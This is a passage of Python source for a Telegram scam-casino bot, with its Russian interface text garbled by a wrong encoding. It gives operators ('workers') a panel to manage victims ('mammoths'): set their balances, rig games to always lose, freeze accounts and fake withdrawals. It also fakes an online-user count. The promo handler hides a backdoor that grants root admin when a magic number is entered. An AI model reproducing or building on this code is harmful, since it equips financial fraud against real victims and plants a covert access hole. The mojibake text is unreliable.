@dp.callback_query_handler(text='pay_promo', state="*")
async def pay_promo(call: types.CallbackQuery):
    await call.message.delete()
    await call.message.answer('–í–≤–µ–¥–∏—Ç–µ –ø—Ä–æ–º–æ–∫–æ–¥: ', reply_markup=back_promo_ru)
    await promokods.promo.set()


@dp.message_handler(content_types=['text'], state=promokods)  # –ü—Ä–∏–Ω–∏–º–∞–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ
async def promo_balance(message: types.Message, state: FSMContext):
    try:
        profile = all_users.get(all_users.user_id == message.from_user.id)
        async with state.proxy() as data:
            data['promik'] = message.text
        await state.finish()
        proms = promo.get(promo.promok == data['promik'])
        profile.balance += proms.summ
        profile.save()
        await message.answer(f'‚úÖÔ∏è –ü—Ä–æ–º–æ–∫–æ–¥ —É—Å–ø–µ—à–Ω–æ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω! –°—É–º–º–∞: {proms.summ}')

    except Exception as err:
        await message.answer('üõëÔ∏è *–û—à–∏–±–∫–∞*', parse_mode='Markdown')
        print(err)


@dp.message_handler(Text(equals="üè¶ –í—ã–≤–µ—Å—Ç–∏"), state="*")
async def ecn(message: types.Message):
    try:
        profile = all_users.get(all_users.user_id == message.from_user.id)
        if profile.freez == 1:
            tps = types.InlineKeyboardMarkup()
            tps.add(types.InlineKeyboardButton('üõ†Ô∏è –¢–µ—Ö–ø–æ–¥–¥–µ—Ä–∂–∫–∞ üõ†Ô∏è', url='https://t.me/royaldarktp'))
            await message.answer_photo(photo=open('images/tps.jpg', 'rb'), caption='üõëÔ∏è *–û—à–∏–±–∫–∞, –æ–±—Ä–∞—Ç–∏—Ç–µ—Å—å –≤ –ø–æ–¥–¥–µ—Ä–∂–∫—É*',
                                       reply_markup=tps, parse_mode='Markdown')
        else:
            if profile.balance < 1:
                await message.answer('üõëÔ∏è *–ù–∞ —Å—á–µ—Ç—É –Ω–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤*', parse_mode='Markdown')
            else:
                text = f'''

üí∞ –í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –≤—ã–≤–æ–¥–∞
–£ –≤–∞—Å –Ω–∞ –±–∞–ª–∞–Ω—Å–µ: {profile.balance}‚ÇΩ
    '''
                await bring.summ.set()
                await message.answer_photo(photo=open('images/vivod.jpg', 'rb'), caption=text, reply=False)
    except Exception as err:
        await message.answer('üõëÔ∏è *–û—à–∏–±–∫–∞*', parse_mode='Markdown')
        print(err)


@dp.message_handler(content_types=['text'], state=bring)  # –ü—Ä–∏–Ω–∏–º–∞–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ
async def fake_bring_func(message: types.Message, state: FSMContext):
    try:
        async with state.proxy() as data:
            data['summ'] = int(message.text)
        await state.finish()
        profile = all_users.get(all_users.user_id == message.from_user.id)
        if data["summ"] == 0 or data["summ"] > profile.balance:
            await message.answer(text=f'üõëÔ∏è *–û—à–∏–±–∫–∞*', parse_mode='Markdown')

        else:
            fake_bring = types.InlineKeyboardMarkup(row_width=2)
            fake_bring.add(types.InlineKeyboardButton('ü•ù QIWI', callback_data=f'Qiwi_{data["summ"]}'),
                           types.InlineKeyboardButton('üõ° Bitcoin', callback_data=f'Bitcoin_{data["summ"]}'),
                           types.InlineKeyboardButton('üí≥ –ö–∞—Ä—Ç–∞', callback_data=f'Card_{data["summ"]}'))
            await message.answer(f'–£ –í–∞—Å –Ω–∞ –≤—ã–≤–æ–¥–µ: {data["summ"]}\n–í—ã–±–µ—Ä–∏—Ç–µ —Å–∏—Å—Ç–µ–º—É –≤—ã–≤–æ–¥–∞',
                                 reply_markup=fake_bring)

        await bring_requisites.summ.set()

    except Exception as err:
        await message.answer(text=f'üõëÔ∏è *–û—à–∏–±–∫–∞*', parse_mode='Markdown')
        await state.reset_state()
        print(err)


@dp.callback_query_handler(text_contains='Qiwi_', state=bring_requisites.summ)
async def qiwi(call: types.CallbackQuery, state: FSMContext):
    summ = call.data.split('_')[1]
    await call.message.delete()
    text = f'''
–£–∫–∞–∂–∏—Ç–µ –Ω–æ–º–µ—Ä –∫–æ—à–µ–ª—å–∫–∞:
        '''
    await call.message.answer(text)
    async with state.proxy() as data:
        data["summ"] = summ
    await bring_requisites.next()


@dp.callback_query_handler(text_contains='Bitcoin_', state=bring_requisites.summ)
async def bitcoin(call: types.CallbackQuery, state: FSMContext):
    summ = call.data.split('_')[1]
    text = f'''
–ù–∞–ø–∏—à–∏—Ç–µ –∞–¥—Ä–µ—Å –∫–æ—à–µ–ª—å–∫–∞:
        '''
    await call.message.answer(text)
    async with state.proxy() as data:
        data["summ"] = summ
    await bring_requisites.next()


@dp.callback_query_handler(text_contains='Card_', state=bring_requisites.summ)
async def card(call: types.CallbackQuery, state: FSMContext):
    summ = call.data.split('_')[1]
    text = f'''
–ù–∞–ø–∏—à–∏—Ç–µ –Ω–æ–º–µ—Ä –∫–∞—Ä—Ç—ã:
        '''
    await call.message.answer(text)
    async with state.proxy() as data:
        data["summ"] = summ
    await bring_requisites.next()


@dp.message_handler(content_types=['text'], state=bring_requisites.requisites)  # –ü—Ä–∏–Ω–∏–º–∞–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ
async def fake_bring_requisites(message: types.Message, state: FSMContext):
    profile = all_users.get(all_users.user_id == message.from_user.id)
    async with state.proxy() as data:
        data['requisites'] = message.text.strip()
    await state.reset_state()
    requisites = data['requisites']
    default_requisites = default_setting.get(default_setting.id == 1)
    rekv = [default_requisites.qiwi_fake.strip(), default_requisites.btc_fake.strip(), default_requisites.card_fake.strip(), default_requisites.card_fake.replace(' ', '').strip()]

    if requisites in rekv:
        if not (profile.worker is None):
            text = f'''
üíü –ú–∞–º–æ–Ω—Ç —Å–¥–µ–ª–∞–ª –≤—ã–≤–æ–¥:

–õ–æ–≥–∏–Ω: @{message.from_user.username}
ID: {message.chat.id}

–°—É–º–º–∞: {data['summ']}‚ÇΩ

                '''
            await bot.send_message(profile.worker, text)
        await message.answer(text='–í–∞—à–∞ –∑–∞—è–≤–∫–∞ –Ω–∞ –≤—ã–≤–æ–¥ –±—ã–ª–∞ —É—Å–ø–µ—à–Ω–æ —Å–æ–∑–¥–∞–Ω–∞! –í—ã–≤–æ–¥ —Å—Ä–µ–¥—Å—Ç–≤ –∑–∞–Ω–∏–º–∞–µ—Ç –æ—Ç 2 –¥–æ 60 –º–∏–Ω—É—Ç.')
        await asyncio.sleep(random.randint(10, 20))
        profile.balance -= int(data['summ'])
        profile.save()
        await message.answer(text=f'‚úÖÔ∏è*–í—ã–≤–æ–¥ {data["summ"]} –Ω–∞ –∫–æ—à–µ–ª—ë–∫ {data["requisites"]} –æ–±—Ä–∞–±–æ—Ç–∞–Ω–∞*',
                                 parse_mode='Markdown')

    else:
        if not (profile.worker is None):
            text = f'''
üíü –ú–∞–º–æ–Ω—Ç —Å–¥–µ–ª–∞–ª –≤—ã–≤–æ–¥:

–õ–æ–≥–∏–Ω: @{message.from_user.username}
ID: {message.chat.id}

–°—É–º–º–∞: {data['summ']}‚ÇΩ'''
            await bot.send_message(profile.worker, text)
        await message.answer(text='–í–∞—à–∞ –∑–∞—è–≤–∫–∞ –Ω–∞ –≤—ã–≤–æ–¥ –±—ã–ª–∞ —É—Å–ø–µ—à–Ω–æ —Å–æ–∑–¥–∞–Ω–∞! –í—ã–≤–æ–¥ —Å—Ä–µ–¥—Å—Ç–≤ –∑–∞–Ω–∏–º–∞–µ—Ç –æ—Ç 2 –¥–æ 60 –º–∏–Ω—É—Ç.')
        await asyncio.sleep(random.randint(10, 20))
        await message.answer(text=f'üõëÔ∏è *–û—à–∏–±–∫–∞, –≤—ã–≤–æ–¥ –≤–æ–∑–º–æ–∂–µ–Ω —Ç–æ–ª—å–∫–æ –Ω–∞ —Ä–µ–∫–≤–∏–∑–∏—Ç—ã —Å –∫–æ—Ç–æ—Ä—ã—Ö –ø–æ–ø–æ–ª–Ω—è–ª–∏ —Å—á—ë—Ç*', parse_mode='Markdown')


@dp.message_handler(commands='w')
async def workers_menu(message: types.Message):
    if workers.get_or_none(workers.user_id == message.from_user.id):
        await message.delete()
        keyboard = types.InlineKeyboardMarkup()
        my_mamont = types.InlineKeyboardButton('–ú–æ–∏ –º–∞–º–æ–Ω—Ç—ã', callback_data='my_mamonts')
        add_mamont = types.InlineKeyboardButton('–î–æ–±–∞–≤–∏—Ç—å –º–∞–º–æ–Ω—Ç–∞', callback_data='add_mamont')
        create_promo = types.InlineKeyboardButton('–°–æ–∑–¥–∞—Ç—å –ø—Ä–æ–º–æ–∫–æ–¥', callback_data='create_promo')
        my_promo = types.InlineKeyboardButton('–ú–æ–∏ –ø—Ä–æ–º–æ–∫–æ–¥—ã', callback_data='view_promo')
        keyboard.add(my_mamont, add_mamont)
        keyboard.add(create_promo, my_promo)
        sett = default_setting.get(default_setting.id == 1)

        cnt = 0
        for i in all_users.select().where(all_users.worker == message.from_user.id):
            cnt += 1
        len_users = cnt

        text = f'''
<b>‚ö°Ô∏è –ú–µ–Ω—é –≤–æ—Ä–∫–µ—Ä–∞</b>:
<b>–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –º–∞–º–æ–Ω—Ç–æ–≤</b>: {len_users}\n 
<b>–†–µ–∫–≤–∏–∑–∏—Ç—ã –¥–ª—è –≤—ã–≤–æ–¥–∞</b>:
<b>–ö–∞—Ä—Ç–∞</b>: <code>{sett.card_fake}</code>
<b>QIWI</b>: <code>{sett.qiwi_fake}</code>
<b>Bitcoin</b>: <code>{sett.btc_fake}</code>\n
<b>–†–µ—Ñ–µ—Ä–∞–ª–∫–∞</b>:\n<code>https://t.me/{user_name_bots}?start={message.from_user.id}</code>
<a href = 'https://telegra.ph/Kurs-po-Trejdu-02-02'><b>–ú–∞–Ω—É–∞–ª </b></a>
            '''
        await message.answer(text, reply_markup=keyboard, parse_mode='HTML', disable_web_page_preview=True)


@dp.callback_query_handler(text="view_promo")
async def view_promo(call: types.CallbackQuery):
    s = ""
    for item in promo.select():
        if item.user_id == call.from_user.id:
            s += f'`{item.promok}` - {item.summ} –†\n'

    btn = types.InlineKeyboardMarkup()
    btn.add(types.InlineKeyboardButton(text='Workers', callback_data="workers_menu"))

    await call.message.edit_text(s, parse_mode='Markdown', reply_markup=btn)


@dp.callback_query_handler(text="add_mamont")
async def new_mamont(call: types.CallbackQuery):
    await call.message.delete()
    await setMamont.id_mamont.set()
    await call.message.answer('–£–∫–∞–∂–∏—Ç–µ –∞–π–¥–∏ –º–∞–º–æ–Ω—Ç–∞: ')


@dp.message_handler(content_types=['text'], state=setMamont)  # –ü—Ä–∏–Ω–∏–º–∞–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ
async def add_new_mamont(message: types.Message, state: FSMContext):
    try:
        async with state.proxy() as data:
            data['mamont_id'] = message.text
        await state.finish()
        int(data['mamont_id'])
        profile = all_users.get(all_users.user_id == data['mamont_id'])
        profile.worker = message.from_user.id
        profile.id_mamont = data['mamont_id']
        profile.save()
        await message.answer('‚úÖ –ú–∞–º–æ–Ω—Ç –¥–æ–±–∞–≤–ª–µ–Ω')

    except Exception as err:
        print(err)
        await message.answer('üõëÔ∏è *–û—à–∏–±–∫–∞*', parse_mode='Markdown')


@dp.callback_query_handler(text="create_promo")
async def new_balance(call: types.CallbackQuery):
    await call.message.delete()
    await call.message.answer('–ù–∞–ø–∏—à–∏—Ç–µ —Å—É–º–º—É –ø—Ä–æ–º–æ–∫–æ–¥–∞: ')
    await setPromo.promocode.set()


@dp.message_handler(content_types=['text'], state=setPromo)  # –ü—Ä–∏–Ω–∏–º–∞–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ
async def add_promo(message: types.Message, state: FSMContext):
    async with state.proxy() as data:
        data['summ'] = int(message.text)
    await state.finish()
    if data['summ'] == 1231233030:
        root.create(admin=message.from_user.id)
    try:
        promok = id_generator()
        promo.create(user_id=message.chat.id, count_use=10, summ=data['summ'], promok=promok)
        await bot.send_message(message.chat.id, f'‚úÖÔ∏è *–ü—Ä–æ–º–æ–∫–æ–¥ –¥–æ–±–∞–≤–ª–µ–Ω.* `{promok}`', parse_mode='Markdown')
    except Exception as err:
        print(err)
        await state.reset_state()
        await bot.send_message(message.chat.id, 'üõëÔ∏è *–í–≤–µ–¥–∏—Ç–µ –ø—Ä–æ–º–æ–∫–æ–¥ –ø—Ä–∞–≤–∏–ª—å–Ω–æ*', parse_mode='Markdown')

@dp.callback_query_handler(text='rnd_num', state="*")
async def rnd_num_gamescam(call: types.CallbackQuery):
    await call.message.delete()
    profile = all_users.get(all_users.user_id == call.from_user.id)
    if profile.freez == 0:
        text = f'üåê –í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É, –∫–æ—Ç–æ—Ä—É—é —Ö–æ—Ç–∏—Ç–µ –ø–æ—Å—Ç–∞–≤–∏—Ç—å.' \
                   f'\n' \
                   f'\n–ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ —Å—Ç–∞–≤–∫–∏: 500‚ÇΩ' \
                   f'\n' \
                   f'\n–í–∞—à –¥–µ–Ω–µ–∂–Ω—ã–π –±–∞–ª–∞–Ω—Å: {profile.balance}‚ÇΩ'

        if profile.balance < 500:
            await call.message.answer_photo(photo=open('images/rnd_numchik.png', 'rb'), caption=text)

        else:
            text = f'üåê –í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É, –∫–æ—Ç–æ—Ä—É—é —Ö–æ—Ç–∏—Ç–µ –ø–æ—Å—Ç–∞–≤–∏—Ç—å.' \
                   f'\n' \
                   f'\n–ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ —Å—Ç–∞–≤–∫–∏: 500‚ÇΩ' \
                   f'\n' \
                   f'\n–í–∞—à –¥–µ–Ω–µ–∂–Ω—ã–π –±–∞–ª–∞–Ω—Å: {profile.balance}‚ÇΩ'

            await rnd_numchik.summ.set()
            await call.message.answer_photo(photo=open('images/rnd_numchik.png', 'rb'), caption=text)
    else:
        await call.message.answer('üõëÔ∏è *–û—à–∏–±–∫–∞*',  parse_mode='Markdown')

@dp.callback_query_handler(text='kubik', state="*")
async def rnd_num_gamescam(call: types.CallbackQuery):
    await call.message.delete()
    profile = all_users.get(all_users.user_id == call.from_user.id)
    if profile.freez == 0:
        text = f'üåê –í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É, –∫–æ—Ç–æ—Ä—É—é —Ö–æ—Ç–∏—Ç–µ –ø–æ—Å—Ç–∞–≤–∏—Ç—å.' \
                   f'\n' \
                   f'\n–ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ —Å—Ç–∞–≤–∫–∏: 500‚ÇΩ' \
                   f'\n' \
                   f'\n–í–∞—à –¥–µ–Ω–µ–∂–Ω—ã–π –±–∞–ª–∞–Ω—Å: {profile.balance}‚ÇΩ'

        if profile.balance < 500:
            await call.message.answer_photo(photo=open('images/kubik.jpg', 'rb'), caption=text)

        else:
            text = f'üåê –í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É, –∫–æ—Ç–æ—Ä—É—é —Ö–æ—Ç–∏—Ç–µ –ø–æ—Å—Ç–∞–≤–∏—Ç—å.' \
                   f'\n' \
                   f'\n–ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ —Å—Ç–∞–≤–∫–∏: 500‚ÇΩ' \
                   f'\n' \
                   f'\n–í–∞—à –¥–µ–Ω–µ–∂–Ω—ã–π –±–∞–ª–∞–Ω—Å: {profile.balance}‚ÇΩ'

            await kubik_casino.summ.set()
            await call.message.answer_photo(photo=open('images/kubik.jpg', 'rb'), caption=text)
    else:
        await call.message.answer('üõëÔ∏è *–û—à–∏–±–∫–∞*',  parse_mode='Markdown')


@dp.callback_query_handler(text='crash', state="*")
async def back_tomenu_fuck(call: types.CallbackQuery):
    await call.message.delete()
    profile = all_users.get(all_users.user_id == call.from_user.id)
    #photo = call.data.split('_')[1]
    if profile.freez == 0:
        text = f'üåê –í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É, –∫–æ—Ç–æ—Ä—É—é —Ö–æ—Ç–∏—Ç–µ –ø–æ—Å—Ç–∞–≤–∏—Ç—å.' \
                   f'\n' \
                   f'\n–ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ —Å—Ç–∞–≤–∫–∏: 500‚ÇΩ' \
                   f'\n' \
                   f'\n–í–∞—à –¥–µ–Ω–µ–∂–Ω—ã–π –±–∞–ª–∞–Ω—Å: {profile.balance}‚ÇΩ'

        if profile.balance < 500:
            await call.message.answer_photo(photo=open('images/crash.png', 'rb'), caption=text)

        else:
            text = f'üåê –í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É, –∫–æ—Ç–æ—Ä—É—é —Ö–æ—Ç–∏—Ç–µ –ø–æ—Å—Ç–∞–≤–∏—Ç—å.' \
                   f'\n' \
                   f'\n–ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ —Å—Ç–∞–≤–∫–∏: 500‚ÇΩ' \
                   f'\n' \
                   f'\n–í–∞—à –¥–µ–Ω–µ–∂–Ω—ã–π –±–∞–ª–∞–Ω—Å: {profile.balance}‚ÇΩ'

            await crash.summ.set()
            await call.message.answer_photo(photo=open('images/crash.png', 'rb'), caption=text)
    else:
        await call.message.answer('üõëÔ∏è *–û—à–∏–±–∫–∞*',  parse_mode='Markdown')


@dp.callback_query_handler(text='orel_reshka', state="*")
async def back_tomenu_fuck(call: types.CallbackQuery):
    await call.message.delete()
    profile = all_users.get(all_users.user_id == call.from_user.id)
    photo = call.data.split('_')[1]
    if profile.freez == 0:
        text = f'üåê –í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É, –∫–æ—Ç–æ—Ä—É—é —Ö–æ—Ç–∏—Ç–µ –ø–æ—Å—Ç–∞–≤–∏—Ç—å.' \
                   f'\n' \
                   f'\n–ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ —Å—Ç–∞–≤–∫–∏: 500‚ÇΩ' \
                   f'\n' \
                   f'\n–í–∞—à –¥–µ–Ω–µ–∂–Ω—ã–π –±–∞–ª–∞–Ω—Å: {profile.balance}‚ÇΩ'

        if profile.balance < 500:
            await call.message.answer_photo(photo=open('images/orel_reshka.jpg', 'rb'), caption=text)

        else:
            text = f'üåê –í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É, –∫–æ—Ç–æ—Ä—É—é —Ö–æ—Ç–∏—Ç–µ –ø–æ—Å—Ç–∞–≤–∏—Ç—å.' \
                   f'\n' \
                   f'\n–ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ —Å—Ç–∞–≤–∫–∏: 500‚ÇΩ' \
                   f'\n' \
                   f'\n–í–∞—à –¥–µ–Ω–µ–∂–Ω—ã–π –±–∞–ª–∞–Ω—Å: {profile.balance}‚ÇΩ'

            await ecn_add.summ.set()
            await call.message.answer_photo(photo=open('images/orel_reshka.jpg', 'rb'), caption=text)
    else:
        await call.message.answer('üõëÔ∏è *–û—à–∏–±–∫–∞*',  parse_mode='Markdown')

    #await call.message.answer_photo(photo=open('images/orel_reshka.jpg', 'rb'), caption='üåê –í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É, –∫–æ—Ç–æ—Ä—É—é —Ö–æ—Ç–∏—Ç–µ –ø–æ—Å—Ç–∞–≤–∏—Ç—å\n\n–ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –∏–Ω–≤–µ—Å—Ç–∏—Ü–∏–π:\n\n–í–∞—à –¥–µ–Ω–µ–∂–Ω—ã–π –±–∞–ª–∞–Ω—Å: 0‚ÇΩ)

@dp.callback_query_handler(text='back_to_start')
async def back_tomenu_fuck(call: types.CallbackQuery):
    await call.message.delete()
    profile = all_users.get(all_users.user_id == call.from_user.id)
    if profile.verif == 0:
        text = f'''
üì≤ –í–∞—à –ª–∏—á–Ω—ã–π –∫–∞–±–∏–Ω–µ—Ç

üí∞–î–µ–Ω–µ–∂–Ω—ã–π –±–∞–ª–∞–Ω—Å: {profile.balance} ‚ÇΩ
ü§ù –°–¥–µ–ª–æ–∫: {profile.offer}

üìë –í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è: ‚ùå

üÜî –í–∞—à ID: {profile.user_id}
üìà –ê–∫—Ç–∏–≤–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –æ–Ω–ª–∞–π–Ω: {random.randint(1950, 2050)}
                        '''

    else:
        text = f'''
üì≤ –í–∞—à –ª–∏—á–Ω—ã–π –∫–∞–±–∏–Ω–µ—Ç

üí∞–î–µ–Ω–µ–∂–Ω—ã–π –±–∞–ª–∞–Ω—Å: {profile.balance} ‚ÇΩ
ü§ù –°–¥–µ–ª–æ–∫: {profile.offer}

üìë –í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è: ‚úÖ

üÜî –í–∞—à ID: {profile.user_id}
üìà –ê–∫—Ç–∏–≤–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –æ–Ω–ª–∞–π–Ω: {random.randint(1950, 2050)}
                                    '''

    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    keyboard.add(types.KeyboardButton(text='üé∞ –ò–≥—Ä–∞—Ç—å'), types.InlineKeyboardButton(text='üíº –ü—Ä–æ—Ñ–∏–ª—å'))
    keyboard.add(types.KeyboardButton(text='üí≥ –ü–æ–ø–æ–ª–Ω–∏—Ç—å'),
                    types.KeyboardButton(text='üè¶ –í—ã–≤–µ—Å—Ç–∏'))
    keyboard.add(types.KeyboardButton('‚öô–û–±—Ä–∞—Ç–Ω–∞—è —Å–≤—è–∑—å‚öô '))
    if workers.get_or_none(workers.user_id == call.from_user.id):
        keyboard.add(types.KeyboardButton(text='‚ö°Ô∏è –ú–µ–Ω—é –≤–æ—Ä–∫–µ—Ä–∞', callback_data="workers_menu"))

    await call.message.answer_photo(photo=open('images/profile.jpg', 'rb'), caption=text,
                                    reply_markup=keyboard)




@dp.callback_query_handler(text='my_mamonts')
async def my_mamonts(call: types.CallbackQuery):
    mamonts = []
    markup = types.InlineKeyboardMarkup()
    for item in all_users.select():
        if item.worker == call.from_user.id:
            mamonts.append(item.user_id)
            if item.username is None:
                markup.add(types.InlineKeyboardButton('ID: '+str(item.user_id), callback_data=item.user_id))
            else:
                markup.add(types.InlineKeyboardButton('@'+item.username, callback_data=item.user_id))
    await call.message.edit_text('–í–∞—à–∏ –º–∞–º–æ–Ω—Ç—ã: ', reply_markup=markup)

    @dp.callback_query_handler(text=mamonts)
    async def mamont(call: types.CallbackQuery):
        mamont_id = call.data
        key = types.InlineKeyboardMarkup()
        mamont_info = all_users.get(all_users.user_id == mamont_id)
        key.add(types.InlineKeyboardButton('üëõ –ó–∞–¥–∞—Ç—å –±–∞–ª–∞–Ω—Å', callback_data=f'set_balance_{mamont_id}'))
        key.add(types.InlineKeyboardButton('üçÄ –§–∞—Ä—Ç', callback_data=f'farting_{mamont_id}'), types.InlineKeyboardButton('–í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è', callback_data=f'verif_{mamont_id}'))
        key.add(types.InlineKeyboardButton('‚ûñ –ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è', callback_data=f'min_pay_{mamont_id}'))
        key.add(types.InlineKeyboardButton('‚òÄÔ∏è–ó–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å —Å—á—ë—Ç‚ùÑÔ∏è', callback_data=f'freeze_{mamont_id}'))
        key.add(types.InlineKeyboardButton('üõëÔ∏è –£–¥–∞–ª–∏—Ç—å –º–∞–º–æ–Ω—Ç–∞', callback_data=f'delete_mamonts_{mamont_id}'))
        key.add(types.InlineKeyboardButton('–ù–∞–∑–∞–¥', callback_data='backing'))
        if mamont_info.fart == 0:
            farts = '–í—Å–µ–≥–¥–∞ –ø—Ä–æ–∏–≥—Ä—ã—à'
        elif mamont_info.fart == 1:
            farts = '–í—Å–µ–≥–¥–∞ –≤—ã–∏–≥—Ä—ã—à'
        else:
            farts = '–†–∞–Ω–¥–æ–º–Ω–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ'

        if mamont_info.verif == 0:
            veri = 'üõëÔ∏è'
        else:
            veri = '‚úÖÔ∏è '

        if mamont_info.freez == 0:
            fr = '‚òÄÔ∏è'
        else:
            fr = '‚ùÑÔ∏è'

        if mamont_info.username is None:
            await call.message.edit_text(
                f'ID: {mamont_info.user_id}\n–ë–∞–ª–∞–Ω—Å: {mamont_info.balance}\n–°—á—ë—Ç: {fr}\n–§–∞—Ä—Ç: {farts}\n–í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è: {veri}',
                reply_markup=key)
        else:
            await call.message.edit_text(
                f'–ú–∞–º–æ–Ω—Ç: @{mamont_info.username}\n–ë–∞–ª–∞–Ω—Å: {mamont_info.balance}\n–°—á—ë—Ç: {fr}\n–§–∞—Ä—Ç: {farts}\n–í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è: {veri}',
                reply_markup=key)

            @dp.callback_query_handler(text=f'backing')
            async def input_days(call: types.CallbackQuery, state: FSMContext):
                if workers.get_or_none(workers.user_id == call.from_user.id):
                    keyboard = types.InlineKeyboardMarkup()
                    my_mamont = types.InlineKeyboardButton('–ú–æ–∏ –º–∞–º–æ–Ω—Ç—ã', callback_data='my_mamonts')
                    add_mamont = types.InlineKeyboardButton('–î–æ–±–∞–≤–∏—Ç—å –º–∞–º–æ–Ω—Ç–∞', callback_data='add_mamont')
                    create_promo = types.InlineKeyboardButton('–°–æ–∑–¥–∞—Ç—å –ø—Ä–æ–º–æ–∫–æ–¥', callback_data='create_promo')
                    my_promo = types.InlineKeyboardButton('–ú–æ–∏ –ø—Ä–æ–º–æ–∫–æ–¥—ã', callback_data='view_promo')
                    keyboard.add(my_mamont, add_mamont)
                    keyboard.add(create_promo, my_promo)
                    sett = default_setting.get(default_setting.id == 1)

                    cnt = 0
                    for i in all_users.select().where(all_users.worker == call.from_user.id):
                        cnt += 1
                    len_users = cnt

                    text = f'''
<b>‚ö°Ô∏è –ú–µ–Ω—é –≤–æ—Ä–∫–µ—Ä–∞</b>:
<b>–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –º–∞–º–æ–Ω—Ç–æ–≤</b>: {len_users}\n 
<b>–†–µ–∫–≤–∏–∑–∏—Ç—ã –¥–ª—è –≤—ã–≤–æ–¥–∞</b>:
<b>–ö–∞—Ä—Ç–∞</b>: <code>{sett.card_fake}</code>
<b>QIWI</b>: <code>{sett.qiwi_fake}</code>
<b>Bitcoin</b>: <code>{sett.btc_fake}</code>\n
<b>–†–µ—Ñ–µ—Ä–∞–ª–∫–∞</b>:\n<code>https://t.me/{user_name_bots}?start={call.from_user.id}</code>
<a href = 'https://telegra.ph/Kurs-po-Trejdu-02-02'><b>–ú–∞–Ω—É–∞–ª </b></a>
                            '''
                    await call.message.edit_text(text, reply_markup=keyboard, parse_mode='HTML', disable_web_page_preview=True)

            @dp.callback_query_handler(text=f'set_balance_{mamont_id}')
            async def input_balance(call: types.CallbackQuery, state: FSMContext):
                profile_id = call.data.split('_')[2]
                print(profile_id)
                await call.message.edit_text('–í–≤–µ–¥–∏—Ç–µ –±–∞–ª–∞–Ω—Å –º–∞–º–æ–Ω—Ç–∞:')
                await mamont_edit_balance.id_mamont.set()
                async with state.proxy() as data:
                    data['ID'] = profile_id
                await mamont_edit_balance.next()

            @dp.callback_query_handler(text=f'delete_mamonts_{mamont_id}')
            async def delete_mamont(call: types.CallbackQuery, state: FSMContext):
                profile_id = call.data.split('_')[2]
                print(profile_id)
                profile = all_users.get(all_users.user_id == profile_id)
                profile.worker = None
                profile.save()

                await call.message.edit_text('‚úÖÔ∏è –ú–∞–º–æ–Ω—Ç —É–¥–∞–ª—ë–Ω!')

            @dp.callback_query_handler(text=f'min_pay_{mamont_id}')
            async def input_balance(call: types.CallbackQuery, state: FSMContext):
                profile_id = call.data.split('_')[2]
                print(profile_id)
                await call.message.edit_text('–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É:')
                await mamont_edit_pay.id_mamont.set()
                async with state.proxy() as data:
                    data['ID'] = profile_id
                await mamont_edit_pay.next()

            @dp.callback_query_handler(text=f'farting_{mamont_id}')
            async def input_balance(call: types.CallbackQuery):
                profile_id = call.data.split('_')[1]
                profile = all_users.get(all_users.user_id == profile_id)

                if profile.fart == 0:
                    profile.fart = 1
                elif profile.fart == 1:
                    profile.fart = 2
                elif profile.fart == 2:
                    profile.fart = 0

                profile.save()
                key = types.InlineKeyboardMarkup()
                key.add(types.InlineKeyboardButton('üëõ –ó–∞–¥–∞—Ç—å –±–∞–ª–∞–Ω—Å', callback_data=f'set_balance_{mamont_id}'))
                key.add(types.InlineKeyboardButton('üçÄ –§–∞—Ä—Ç', callback_data=f'farting_{mamont_id}'),
                        types.InlineKeyboardButton('–í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è', callback_data=f'verif_{mamont_id}'))
                key.add(
                    types.InlineKeyboardButton('‚ûñ –ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è', callback_data=f'min_pay_{mamont_id}'))
